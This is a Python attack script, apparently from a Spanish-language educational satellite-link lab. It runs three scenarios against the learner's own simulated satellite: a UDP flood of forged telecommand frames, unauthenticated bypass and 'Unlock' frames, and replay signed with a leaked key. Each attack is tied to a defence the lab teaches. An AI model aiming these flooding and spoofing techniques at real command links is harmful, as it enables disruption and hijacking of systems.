"""
Atacante - fase 3. Los ataques de la fase 2 (attack_f2.py) siguen fallando;
aqui se prueban tres escenarios nuevos:

  flood [--n 300]      inundacion: cientos de tramas falsas lo mas rapido posible.
                       Objetivo: saturar al satelite o enterrar a la tierra en
                       eventos. Defensa: limite de eventos y resumen.
  bypass               trama BD (bypass) y comando BC 'Unlock' SIN SDLS.
                       El bypass se salta el FARM, pero nunca la seguridad.
  filtrada <clave_hex> el atacante tiene una clave TC filtrada (por ejemplo,
                       pegada en un chat) y la usa con una trama BD. Funciona...
                       hasta que la tierra ejecuta 'rotar'.

Uso (en PowerShell, desde la carpeta del proyecto):
    py attacks\\attack_f3.py --sat 192.168.33.108 flood
    py attacks\\attack_f3.py --sat 192.168.33.108 bypass
    py attacks\\attack_f3.py --sat 192.168.33.108 filtrada 3f090e2c...

Solo contra tu propio C5, en tu propia red.
"""

import argparse
import os
import random
import secrets
import socket
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ground"))

from ccsds import cop1, frames, sdls, services  # noqa: E402

TC_PORT = 10025
RED = bytes([255, 0, 0])


def send(sat, frame: bytes, label: str, quiet: bool = False):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(1.0)
        s.sendto(frame, sat)
        if not quiet:
            print(f"[ATACANTE] {label} ({len(frame)} bytes): {frame.hex()}")
        try:
            data, _ = s.recvfrom(2048)
            print(f"[ATACANTE] El satelite me responde ({len(data)} bytes, cifrado). Me ha tomado por la tierra.")
            return True
        except (socket.timeout, ConnectionResetError):
            if not quiet:
                print("[ATACANTE] Sin respuesta.")
            return False


def flood(sat, n: int):
    fake = sdls.SecurityAssociation(sdls.SPI_TC, secrets.token_bytes(32))
    pkt = services.build_tc_packet(services.TC_SET_COLOR, 1, RED)
    frames_list = [sdls.build_secure_tc_frame(fake, pkt, seq=i & 0xFF, iv_counter=10**15 + i) for i in range(n)]
    print(f"[ATACANTE] Envio {n} tramas falsas lo mas rapido posible...")
    t0 = time.time()
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        for f in frames_list:
            s.sendto(f, sat)
    dt = time.time() - t0
    print(f"[ATACANTE] {n} tramas en {dt:.2f} s ({n / max(dt, 1e-6):.0f} tramas/s).")
    print("           Mira la consola de tierra: deberias ver unos pocos eventos y un aviso de")
    print("           INUNDACION con el resto resumido. Prueba un 'color' desde tierra mientras tanto.")


def bypass(sat):
    pkt = services.build_tc_packet(services.TC_SET_COLOR, random.randint(0, 0x3FFF), RED)
    bd = frames.build_tc_frame(pkt, seq=0, bypass=True)
    print("[ATACANTE] 1) Trama BD (bypass) sin SDLS: '¿me salto los controles?'")
    send(sat, bd, "Trama BD enviada")
    bc = frames.build_tc_frame(cop1.UNLOCK, seq=0, bypass=True, control=True)
    print("[ATACANTE] 2) Comando de control BC 'Unlock' sin SDLS")
    send(sat, bc, "Trama BC enviada")
    print("           Las dos deberian llegar a tierra como EVENTO DE SEGURIDAD.")


def leaked(sat, key_hex: str):
    try:
        key = bytes.fromhex(key_hex)
        assert len(key) == 32
    except (ValueError, AssertionError):
        print("[ATACANTE] La clave debe ser de 32 bytes en hex (64 caracteres).")
        return 1
    sa = sdls.SecurityAssociation(sdls.SPI_TC, key)
    pkt = services.build_tc_packet(services.TC_SET_COLOR, random.randint(0, 0x3FFF), RED)
    # BD para no tener que adivinar el N(S); IV del reloj para ir por delante del contador
    frame = sdls.build_secure_tc_frame(sa, pkt, seq=0, iv_counter=time.time_ns() // 1000 + 10**6, bypass=True)
    print("[ATACANTE] Uso una clave TC filtrada para mandar 'pantalla roja' con una trama BD.")
    if send(sat, frame, "Trama firmada con la clave filtrada"):
        print("[ATACANTE] ACEPTADA: con la clave filtrada tengo el control. Por eso se rota una clave expuesta.")
    else:
        print("[ATACANTE] Rechazada: esa clave ya no esta activa (o no era la buena).")
    return 0


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="Atacante (fase 3, solo para tu laboratorio)")
    p.add_argument("--sat", required=True, help="IP de TU C5")
    p.add_argument("--port", type=int, default=TC_PORT, help=argparse.SUPPRESS)
    sub = p.add_subparsers(dest="escenario", required=True)
    fp = sub.add_parser("flood", help="inundacion de tramas falsas")
    fp.add_argument("--n", type=int, default=300)
    sub.add_parser("bypass", help="tramas BD/BC sin SDLS")
    lp = sub.add_parser("filtrada", help="usar una clave TC filtrada")
    lp.add_argument("clave")
    args = p.parse_args(argv)
    sat = (args.sat, args.port)
    if args.escenario == "flood":
        flood(sat, max(1, min(args.n, 5000)))
    elif args.escenario == "bypass":
        bypass(sat)
    else:
        return leaked(sat, args.clave)
    return 0


if __name__ == "__main__":
    sys.exit(main())
